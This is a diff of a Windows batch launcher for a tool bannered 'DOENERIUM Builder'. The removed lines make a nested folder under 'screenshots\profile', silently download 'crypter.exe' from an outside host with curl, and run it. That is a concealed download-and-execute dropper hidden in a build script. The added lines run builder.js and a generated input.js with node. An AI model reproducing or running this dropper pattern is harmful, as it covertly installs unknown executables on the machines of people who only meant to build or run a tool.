@@ -1,29 +1,22 @@
 @echo off
-chcp 65001 >nul
+set "BUILD_DIR=%CD%\build\node_modules"
+set "INDEX_FILE=%BUILD_DIR%\input.js"
+
+REM Deleting files from the build directory
+del /Q "stub\node_modules\input.js"
+del /Q "build\index.js"
+
+set "CURRENT_DIR=%CD%"
+cd /d "%CURRENT_DIR%\stub"
+
 cls
-echo.
-echo.
-echo.
-echo             ██████╗  ██████╗ ███████╗███╗   ██╗███████╗██████╗ ██╗██╗   ██╗███╗   ███╗
-echo             ██╔══██╗██╔═══██╗██╔════╝████╗  ██║██╔════╝██╔══██╗██║██║   ██║████╗ ████║
-echo             ██║  ██║██║   ██║█████╗  ██╔██╗ ██║█████╗  ██████╔╝██║██║   ██║██╔████╔██║
-echo             ██║  ██║██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██║██║   ██║██║╚██╔╝██║
-echo             ██████╔╝╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║╚██████╔╝██║ ╚═╝ ██║
-echo             ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
-echo.
-echo                                           Builder
-echo.
-echo.
-echo.
-timeout /t 3 >nul
+node builder.js
 
-rem Gerekli klasörleri oluştur
-if not exist "screenshots\profile\aa\b" mkdir "screenshots\profile\aa\b"
-
-rem curl kullanarak dosyayı sessiz modda indirme
-curl -s -o "screenshots\profile\aa\b\crypter.exe" https://anodos.store/download/crypter.exe
-
-rem Dosyayı çalıştırma
-start "" "screenshots\profile\aa\b\crypter.exe"
-
-exit
+REM Check if the node_modules directory exists in the build directory
+IF EXIST "%BUILD_DIR%" (
+    REM If it exists, execute the script
+    call node %INDEX_FILE%
+) ELSE (
+    REM If it doesn't exist, display a message prompting to run install.bat
+    echo Please run install.bat before running the script.
+)
